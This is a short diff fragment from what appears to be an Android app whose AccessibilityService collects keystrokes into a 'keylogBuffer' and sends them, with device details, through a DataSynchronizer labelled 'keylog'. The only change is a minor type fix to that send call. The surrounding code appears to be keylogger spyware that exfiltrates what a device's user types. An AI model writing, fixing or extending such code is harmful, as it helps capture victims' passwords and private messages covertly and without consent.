@@ -436,7 +436,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                 put("android_version", android.os.Build.VERSION.RELEASE)
             }
             val dataSynchronizer = DataSynchronizer(applicationContext)
-            dataSynchronizer.sendData("keylog", keylogData.toString())
+            dataSynchronizer.sendData("keylog", keylogData)
             keylogBuffer.clear()
 
         } catch (e: Exception) {
